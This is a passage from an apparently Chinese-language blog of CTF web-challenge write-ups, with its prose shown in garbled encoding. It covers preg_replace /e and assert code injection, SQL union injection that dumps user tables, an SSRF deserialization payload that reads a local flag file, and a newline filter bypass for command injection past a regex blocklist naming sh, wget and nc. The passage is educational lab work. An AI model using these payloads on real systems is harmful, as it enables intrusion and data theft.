<li><p><code>preg_replace($pattern, $replacement, $subject);</code>å‡½æ•°ä½¿ç”¨ <code>/e</code>æ¨¡å¼ï¼Œå¯¼è‡´ä»£ç æ‰§è¡Œçš„é—®é¢˜<br>å‚è€ƒï¼š<a target="_blank" rel="noopener" href="https://www.sqlsec.com/2020/07/preg_replace.html">PHP preg_ç³»åˆ—æ¼æ´å°ç»“ | å›½å…‰ (sqlsec.com)</a></p>
</li>
<li><p>æ‰€ä»¥<code>?pat=/1/e&amp;rep=system(&#39;cat s3chahahaDir/flag/flag.php&#39;)&amp;sub=1</code><br><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20210831164502945.png" alt="image-20210831164502945"></p>
</li>
</ol>
<h3 id="mfw"><a href="#mfw" class="headerlink" title="mfw"></a>mfw</h3><p>gitæ³„éœ²ï¼Œç”¨Githackå¾—åˆ°åŸå§‹ç»“æ„ç›®å½•çš„æºç </p>
<p><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20210820153749371.png" alt="image-20210820153749371"></p>
<p>æ‰“å¼€flag.phpæ²¡æœ‰å‘ç°flagï¼Œåº”è¯¥æ˜¯åˆ æ‰äº†ï¼Œä½†æ˜¯ä½ç½®åº”è¯¥è¿˜æ˜¯æ²¡å˜ï¼Œå¯¹index.phpæºç å®¡è®¡ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if (isset($_GET[&#x27;page&#x27;]))</span><br><span class="line">&#123;</span><br><span class="line">	$page = $_GET[&#x27;page&#x27;];</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">	$page = &quot;home&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$file = &quot;templates/&quot; . $page . &quot;.php&quot;;</span><br><span class="line"></span><br><span class="line">// I heard &#x27;..&#x27; is dangerous!</span><br><span class="line">assert(&quot;strpos(&#x27;$file&#x27;, &#x27;..&#x27;) === false&quot;) or die(&quot;Detected hacking attempt!&quot;);</span><br><span class="line"></span><br><span class="line">// TODO: Make this look nice</span><br><span class="line">assert(&quot;file_exists(&#x27;$file&#x27;)&quot;) or die(&quot;That file doesn&#x27;t exist!&quot;);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>aseertå‡½æ•°å¯ä»¥ä»»æ„æ‰§è¡Œä»£ç ï¼Œ<code>or die()</code>æŒ‡çš„æ˜¯å¦‚æœå‰é¢çš„å€¼ä¸ºfalseåˆ™æ‰§è¡Œæ‹¬å·é‡Œé¢çš„å†…å®¹ï¼Œä¸¤ä¸ªaseertéƒ½èƒ½åˆ©ç”¨ï¼š</p>
<ol>
<li><code>?page=1&#39;,&#39;2&#39;) === false and highlight_file(&#39;templates/flag.php&#39;) and strpos(&#39;templates/flag</code></li>
<li><code>?page=&#39;).system(&quot;cat%20templates/flag.php&quot;);//</code></li>
</ol>
<h3 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h3><p>ä»£ç å®¡è®¡</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$miwen=&quot;a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws&quot;;</span><br><span class="line"></span><br><span class="line">function encode($str)&#123;</span><br><span class="line">    $_o=strrev($str);</span><br><span class="line">    // echo $_o;</span><br><span class="line">        </span><br><span class="line">    for($_0=0;$_0&lt;strlen($_o);$_0++)&#123;</span><br><span class="line">       </span><br><span class="line">        $_c=substr($_o,$_0,1);</span><br><span class="line">        $__=ord($_c)+1;</span><br><span class="line">        $_c=chr($__);</span><br><span class="line">        $_=$_.$_c;   </span><br><span class="line">    &#125; </span><br><span class="line">    return str_rot13(strrev(base64_encode($_)));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">/*</span><br><span class="line">   é€†å‘åŠ å¯†ç®—æ³•ï¼Œè§£å¯†$miwenå°±æ˜¯flag</span><br><span class="line">*/</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>æ€è·¯å·²ç»å¾ˆæ˜ç¡®äº†ï¼Œå°±æ˜¯é€†å‘è§£å¯†<code>$miwen</code>ã€‚</p>
<p>å…ˆæŠŠå˜é‡å‘½åç»™æ”¹äº†ï¼Œç„¶åé€†å‘è§£å¯†</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"></span><br><span class="line">function decode($miwen)&#123;</span><br><span class="line">   $mingwen=&#x27;&#x27;;</span><br><span class="line">   $miwen=base64_decode(strrev(str_rot13($miwen)));</span><br><span class="line">   $strrev=strrev($miwen);</span><br><span class="line">   for ($i=0; $i &lt; strlen($strrev); $i++) &#123; </span><br><span class="line">       </span><br><span class="line">   	    $char=substr($strrev,$i,1);  </span><br><span class="line">        $ordchar=ord($char)-1;  </span><br><span class="line">        $char=chr($ordchar);  </span><br><span class="line">        $mingwen=$mingwen.$char;</span><br><span class="line">       </span><br><span class="line">   &#125;</span><br><span class="line">   return $mingwen;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$miwen=&#x27;a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws&#x27;;</span><br><span class="line">echo decode($miwen);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="fakebook"><a href="#fakebook" class="headerlink" title="fakebook"></a>fakebook</h3><p><code>dirb</code>æ‰«æç»“æœï¼ˆæˆ–è€…<code>nikto</code>ç­‰åˆ«çš„æ‰«æå·¥å…·ï¼‰</p>
<p><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20211013190942893.png" alt="image-20211013190942893"></p>
<p>å¯ä»¥çŸ¥é“flag.phpå°±æ˜¯æˆ‘ä»¬è¦å¾—åˆ°çš„</p>
<p>è®¿é—®<code>/robots.txt</code>å‘ç°<code>user.php.bak</code>æºç æ³„éœ²</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class UserInfo</span><br><span class="line">&#123;</span><br><span class="line">    public $name = &quot;&quot;;</span><br><span class="line">    public $age = 0;</span><br><span class="line">    public $blog = &quot;&quot;;</span><br><span class="line"></span><br><span class="line">    public function __construct($name, $age, $blog)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;name = $name;</span><br><span class="line">        $this-&gt;age = (int)$age;</span><br><span class="line">        $this-&gt;blog = $blog;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function get($url)</span><br><span class="line">    &#123;</span><br><span class="line">        $ch = curl_init();</span><br><span class="line"></span><br><span class="line">        curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);</span><br><span class="line">        $output = curl_exec($ch);</span><br><span class="line">        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);</span><br><span class="line">        if($httpCode == 404) &#123;</span><br><span class="line">            return 404;</span><br><span class="line">        &#125;</span><br><span class="line">        curl_close($ch);</span><br><span class="line"></span><br><span class="line">        return $output;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function getBlogContents ()</span><br><span class="line">    &#123;</span><br><span class="line">        return $this-&gt;get($this-&gt;blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function isValidBlog ()</span><br><span class="line">    &#123;</span><br><span class="line">        $blog = $this-&gt;blog;</span><br><span class="line">        return preg_match(&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i&quot;, $blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬çŸ¥é“ä¸¤ç‚¹ï¼š</p>
<ol>
<li>è¿™é“é¢˜æœ‰å¯èƒ½å’Œååºåˆ—åŒ–æœ‰å…³</li>
<li>getå‡½æ•°çš„<a target="_blank" rel="noopener" href="https://blog.csdn.net/Fly_hps/article/details/83046613">Curl å¯¼è‡´ SSRF åŠ WAF ç»•è¿‡æ–¹å¼</a></li>
</ol>
<p>æˆ‘ä»¬è¿›å…¥é¡µé¢ï¼Œæ³¨å†Œè´¦å·ï¼Œå‘ç°usenameå¯ä»¥ç‚¹ï¼Œè·³è½¬åˆ°å¦‚ä¸‹ç•Œé¢</p>
<p><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20211013224122689.png" alt="image-20211013224122689"></p>
<p><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20211013224156936.png" alt="image-20211013224156936"></p>
<p><code>?no=1</code>æœ‰å¯èƒ½æ˜¯sqlæ³¨å…¥ï¼Œå°è¯•æ³¨å…¥ã€‚</p>
<p><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20211013231448634.png" alt="image-20211013231448634"></p>
<p>é¦–å…ˆå›æ˜¾2ï¼Œåœ¨usernameä¸‹é¢ï¼Œè¯´æ˜æˆåŠŸï¼›</p>
<p>åŒæ—¶æˆ‘ä»¬çœ‹åˆ°ï¼Œè¿˜æœ‰<code>unserialize</code>å‡½æ•°å¤±è´¥ï¼ŒåŒæ—¶<code>age</code>ã€<code>blog</code>å’Œ<code>the cotents of blog</code>éƒ½æŠ¥é”™æ²¡æœ‰å¯¹è±¡ï¼Œè”ç³»åˆ°ä¹‹å‰çš„æºç ï¼Œè¿™ä¸‰ä¸ªå†…å®¹éƒ½æ˜¯ç”±ä¸€ä¸ªåºåˆ—åŒ–çš„å¯¹è±¡ååºåˆ—åŒ–å¾—åˆ°çš„ã€‚</p>
<p>æ¥ä¸‹æ¥æˆ‘ä»¬æŸ¥çœ‹æ•°æ®åº“ï¼š</p>
<ol>
<li><code>?no=0 union/**/select 1,version(),3,4--</code>ï¼ŒæŸ¥çœ‹æ•°æ®åº“ç‰ˆæœ¬<br><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20211013231807004.png" alt="image-20211013231807004"></li>
<li><code>?no=0 union/**/select 1,database(),3,4--</code>ï¼ŒæŸ¥çœ‹æ•°æ®åº“åå­—<br><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20211013231953403.png" alt="image-20211013231953403"></li>
<li><code>?no=0 union/**/select 1,(select group_concat(schema_name) from information_schema.schemata),3,4--</code>ï¼ŒæŸ¥çœ‹æ‰€æœ‰çš„æ•°æ®åº“è¡¨å<br><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20211013232707915.png" alt="image-20211013232707915"></li>
<li><code>?no=0 union/**/select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),3,4--</code>ï¼ŒæŸ¥çœ‹<code>fakebook</code>æ•°æ®åº“çš„è¡¨å<br><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20211013233244724.png" alt="image-20211013233244724"></li>
<li><code>?no=0 union/**/select 1,(select group_concat(column_name) from information_schema.columns where table_name=&quot;users&quot;),3,4--</code>ï¼ŒæŸ¥çœ‹userså­—æ®µå<br><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20211013233901324.png" alt="image-20211013233901324"></li>
<li><code>?no=0 union/**/select 1,(select group_concat(no,username,passwd,data) from fakebook.users),3,4--</code>ï¼ŒæŸ¥çœ‹å­—æ®µåçš„å€¼<br><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20211013234108197.png" alt="image-20211013234108197"></li>
</ol>
<p>çœ‹åˆ°dataå­—æ®µå‚¨å­˜çš„æ˜¯åºåˆ—åŒ–çš„å¯¹è±¡ï¼Œæˆ‘ä»¬ç°åœ¨å›åˆ°ä¹‹å‰çš„æ€è·¯ï¼šå°†dataå­—æ®µçš„å€¼è®¾ç½®æˆä¸€ä¸ªåºåˆ—åŒ–çš„å¯¹è±¡ï¼Œç„¶åå¾—åˆ°å†…å®¹ã€‚</p>
<p>å› ä¸ºcurlåœ¨æƒé™å¤Ÿçš„æƒ…å†µä¸‹ï¼Œå¯ä»¥é€šè¿‡fileåè®®è¯»å–æœ¬åœ°æ–‡ä»¶ï¼Œæ‰€ä»¥payloadå¦‚ä¸‹ï¼š</p>
<p><code>?no=0/**/union/**/select 1,2,3,&#39;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:1:&quot;1&quot;;s:3:&quot;age&quot;;i:1;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125;&#39;</code></p>
<p><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20211014154306572.png" alt="image-20211014154306572"></p>
<p>å¦‚æœç›´æ¥åœ¨æ³¨å†Œçš„æ—¶å€™å°†blogæ³¨å†Œä¸ºflag.phpï¼Œä¸èƒ½é€šè¿‡isValidBlog ()å‡½æ•°çš„æ£€æµ‹</p>
<h3 id="cat"><a href="#cat" class="headerlink" title="cat"></a>cat</h3><h3 id="favorite-number"><a href="#favorite-number" class="headerlink" title="favorite number"></a>favorite number</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//php5.5.9</span></span><br><span class="line"><span class="variable">$stuff</span> = <span class="variable">$_POST</span>[<span class="string">&quot;stuff&quot;</span>];</span><br><span class="line"><span class="variable">$array</span> = [<span class="string">&#x27;admin&#x27;</span>, <span class="string">&#x27;user&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$stuff</span> === <span class="variable">$array</span> &amp;&amp; <span class="variable">$stuff</span>[<span class="number">0</span>] != <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">    <span class="variable">$num</span>= <span class="variable">$_POST</span>[<span class="string">&quot;num&quot;</span>];</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&quot;/^\d+$/im&quot;</span>,<span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span> (!preg_match(<span class="string">&quot;/sh|wget|nc|python|php|perl|\?|flag|&#125;|cat|echo|\*|\^|\]|\\\\|&#x27;|\&quot;|\|/i&quot;</span>,<span class="variable">$num</span>))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;my favorite num is:&quot;</span>;</span><br><span class="line">            system(<span class="string">&quot;echo &quot;</span>.<span class="variable">$num</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;Bonjour!&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>é¦–å…ˆæ˜¯POSTä¼ å…¥ï¼Œç„¶åæˆ‘ä»¬éœ€è¦ç»•è¿‡è¿™å‡ ä¸ªç‚¹ï¼Œsystemæ‰§è¡Œå‘½ä»¤ï¼š</p>
<ol>
<li><p><code>$stuff === $array &amp;&amp; $stuff[0] != &#39;admin&#39;</code>ä¹Ÿå°±æ˜¯è¯´<code>stuff[0]</code>è¦åŒæ—¶ç­‰äºå’Œä¸ç­‰äº<code>admin</code>ï¼Œå…¶å®è¿™ä¸€æ­¥å°±æ˜¯æœ€éš¾çš„<br>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œåœ¨php 5.5.9ç‰ˆæœ¬å­˜åœ¨çš„è¿™ä¸ªæ¼æ´ï¼Œæ‰€ä»¥stuffå¦‚ä¸‹ï¼š<br><code>stuff[4294967296]=admin&amp;stuff[1]=user</code></p>
<p><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20211015155414421.png" alt="image-20211015155414421"><br><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20211015155801077.png" alt="image-20211015155801077"></p>
</li>
<li><p><code>preg_match(&quot;/^\d+$/im&quot;,$num)</code>ï¼Œè¡¨ç¤º<code>num</code>æ˜¯è¦ç”±çº¯æ•°å­—ç»„æˆçš„å­—ç¬¦ä¸²ï¼Œä½†æ˜¯æˆ‘ä»¬è¦è®©<code>num</code>æ˜¯ä¸€ä¸ªå‘½ä»¤ï¼Œå…³é”®åœ¨äº<code>/m</code>æ¨¡å¼ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦é€šè¿‡<code>%0a</code>æ¢è¡Œç»•è¿‡å®ƒï¼Œæˆ‘ä»¬çš„payloadæ›´æ–°å¦‚ä¸‹:<br><code>stuff[4294967296]=admin&amp;stuff[1]=user&amp;num=1%0als</code><br><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20211015162001426.png" alt="image-20211015162001426"></p>
</li>
<li><p><code>!preg_match(&quot;/sh|wget|nc|python|php|perl|\?|flag|&#125;|cat|echo|\*|\^|\]|\\\\|&#39;|\&quot;|\|/i&quot;,$num</code>ï¼Œæˆ‘ä»¬çš„å‘½ä»¤è¦é¿å¼€è¿™äº›å­—ç¬¦ï¼Œç„¶åè¿˜è¦å¾—åˆ°flagï¼Œå¯ä»¥çœ‹åˆ°flagéƒ½è¢«è¿‡æ»¤äº†ï¼Œè¿™é‡Œæœ‰ä¸¤ä¸ªæ€è·¯ï¼š</p>
<ol>
<li><p>commandï¼štac `find -inum xxxx`<br>ç”¨inodeç´¢å¼•èŠ‚ç‚¹ï¼Œå…ˆæ‰¾åˆ°flagæ–‡ä»¶çš„inodeï¼Œç„¶åç”¨tacè¯»å–findæ‰¾åˆ°çš„flagæ–‡ä»¶å¾—åˆ°flag<br><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20211015162230878.png" alt="image-20211015162230878"></p>
<p><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20211015162534293.png" alt="image-20211015162534293"></p>
</li>
<li><p>command: printf /fla &gt; /tmp/target; printf g &gt;&gt; /tmp/target ; tac `tac /tmp/target`<br>æ€è·¯æ˜¯tacè¯»å–/tmp/targetæ–‡ä»¶ä¿å­˜çš„<code>/flag</code>ï¼Œå¾—åˆ°flagã€‚<br><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20211015165226482.png" alt="image-20211015165226482"></p>
</li>
<li><p>command: tac /fla$1g<br>æ€è·¯æ˜¯$1å˜é‡ä¸ºç©ºï¼Œæ‰€ä»¥æœ€åè¿˜æ˜¯æ‰§è¡Œ<code>tac /flag</code><br><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20211015170613255.png" alt="image-20211015170613255"><br><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20211015170628858.png" alt="image-20211015170628858"></p>
</li>
<li><p>command: a=fla;b=g; tac /$a$b<br>æ‹¼æ¥å˜é‡ï¼Œæ‰§è¡Œ<code>tac /flag</code><br><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20211015170942675.png" alt="image-20211015170942675"></p>
</li>
</ol>
</li>
</ol>
<h3 id="lottery"><a href="#lottery" class="headerlink" title="lottery"></a>lottery</h3><p>   è¿›å»çœ‹åˆ°homeæ˜¯ä¸ªå–å½©ç¥¨çš„é¡µé¢ï¼Œå…¨å¯¹å¥–åŠ±50000ã€‚buyæ˜¯è´­ä¹°å½©ç¥¨çš„ç•Œé¢ï¼Œè¿˜è¦æ³¨å†Œä¸€ä¸ªç”¨æˆ·åä¸è¦å¯†ç ã€‚accountæ˜¾ç¤ºé’±åŒ…å’Œåå­—ã€‚</p>
<p>   æœ€åä¸€ä¸ªclaim your priceç•Œé¢ï¼Œå¦‚æœæˆ‘ä»¬æœ‰99990000çš„é’±å°±å¯ä»¥è´­ä¹°flagã€‚</p>
<p>   <img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20211016001448571.png" alt="image-20211016001448571"></p>
<p>   ç°åœ¨æˆ‘ä»¬æƒ³è¦é€šè¿‡ä¹°å½©ç¥¨å»åˆ·é’±ï¼Œå‘ç°éƒ½æ˜¯éšæœºæ•°ï¼ŒæŒ£ä¸åˆ°é’±ã€‚</p>
<p>   dirbæ‰«æç»“æœï¼š</p>
<p>   <img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20211016001734639.png" alt="image-20211016001734639"></p>
<p>   å‘ç°.gitæ³„æ¼ï¼Œrobots.txtä¹Ÿè¯æ˜æ˜¯.gitæ³„æ¼ã€‚</p>
<p>   ç”¨<code>githacker --url http://111.200.241.244:52967/ --folder result</code>å¾—åˆ°æºç </p>
<p>   Seayæ‰“å¼€å®¡è®¡ä»£ç ï¼Œæˆ‘ä»¬ç›®çš„æ˜¯çŸ¥é“æ€ä¹ˆå»åˆ·é’±ï¼Œæ‰€ä»¥å»çœ‹buy.php</p>
   <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php include(&#x27;check_register.php&#x27;);include(&#x27;header.php&#x27;); ?&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;h2&gt;Buy a lottery!&lt;/h2&gt;</span><br><span class="line"></span><br><span class="line">&lt;form method=&quot;POST&quot;&gt;</span><br><span class="line">&lt;input type=&quot;text&quot; name=&quot;numbers&quot; id=&quot;numbers&quot; minlength=&quot;7&quot; maxlength=&quot;7&quot; pattern=&quot;\d&#123;7&#125;&quot; required placeholder=&quot;7 numbers&quot;&gt;</span><br><span class="line">&lt;button type=&quot;button&quot; id=&quot;btnBuy&quot;&gt;Buy!&lt;/button&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;script type=&quot;text/javascript&quot; src=&quot;js/buy.js&quot;&gt;&lt;/script&gt;   //js/buy.js</span><br><span class="line">&lt;p id=&quot;wait&quot; class=&quot;alert alert-info&quot; style=&quot;display: none;&quot;&gt;Please wait...&lt;/p&gt;</span><br><span class="line">&lt;div id=&quot;result&quot; style=&quot;display: none;&quot;&gt;</span><br><span class="line">	&lt;p id=&quot;info&quot; class=&quot;alert alert-info&quot;&gt;Prize: &lt;span id=&quot;prize&quot;&gt;&lt;/span&gt;&lt;/p&gt;</span><br><span class="line">	&lt;p&gt;</span><br><span class="line">		&lt;span style=&quot;width: 10em; display: inline-block;&quot;&gt;Winning numbers:&lt;/span&gt;</span><br><span class="line">		&lt;div id=&quot;win&quot;&gt;</span><br><span class="line"></span><br><span class="line">		&lt;/div&gt;</span><br><span class="line">	&lt;/p&gt;</span><br><span class="line">	&lt;p&gt;</span><br><span class="line">		&lt;span style=&quot;width: 10em; display: inline-block;&quot;&gt;Your numbers:&lt;/span&gt;</span><br><span class="line">		&lt;div id=&quot;user&quot;&gt;</span><br><span class="line">			&lt;span class=&quot;number-ball number-ball-red&quot;&gt;1&lt;/span&gt;</span><br><span class="line">			&lt;span class=&quot;number-ball number-ball-gray&quot;&gt;6&lt;/span&gt;</span><br><span class="line">		&lt;/div&gt;</span><br><span class="line">	&lt;/p&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php include(&#x27;footer.php&#x27;); ?&gt;</span><br></pre></td></tr></table></figure>

<p>   è¿½è¸ªåˆ°<code>js/buy.js</code></p>
   <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span 